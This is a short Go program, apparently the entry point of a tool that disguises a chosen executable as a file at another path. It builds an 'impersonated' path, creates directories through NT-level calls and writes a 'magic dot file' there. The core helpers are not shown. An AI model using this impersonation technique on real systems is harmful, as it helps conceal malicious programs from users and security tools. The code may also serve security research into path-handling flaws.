package main

import (
	"os"
	"path/filepath"
)
import "magicfile/utils"

import "fmt"

func main() {

	fmt.Println("Hello, World!")
	argCount := len(os.Args)
	if argCount != 3{
		os.Exit(1)
	}
	impersonate_to_path := os.Args[1]
	exe_path := os.Args[2]
	target_file_abs_path,err := filepath.Abs(impersonate_to_path)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(target_file_abs_path)
	impersonated_file_path := utils.Generate_impersonated_path(target_file_abs_path)
	fmt.Println(impersonated_file_path)
	utils.Nt_makedirs(impersonated_file_path)
	utils.Create_magic_dot_file(impersonated_file_path, exe_path)
}